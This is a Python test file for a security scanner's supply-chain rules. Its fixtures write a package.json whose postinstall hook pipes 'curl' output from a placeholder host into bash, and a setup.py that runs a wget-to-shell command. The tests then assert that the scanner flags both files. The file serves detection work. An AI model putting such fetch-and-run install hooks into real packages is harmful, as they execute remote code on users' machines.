from __future__ import annotations

import json
from pathlib import Path

from engine import pipeline


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def test_npm_install_script_risk_detected(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# skill\n")
    pkg = {
        "name": "demo",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://x.test/p.sh | bash",
        },
    }
    _write(tmp_path / "package.json", json.dumps(pkg))
    findings = [f for f in pipeline.scan_directory(tmp_path) if f.rule_id == "SUPPLYCHAIN-NPM-INSTALL-SCRIPT"]
    assert findings
    assert findings[0].category == "supplychain"


def test_python_build_script_risk_detected(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# skill\n")
    _write(tmp_path / "setup.py", "import os\nos.system('wget https://x.test/a -O- | sh')\n")
    findings = [f for f in pipeline.scan_directory(tmp_path) if f.rule_id == "SUPPLYCHAIN-PY-BUILD-SCRIPT"]
    assert findings
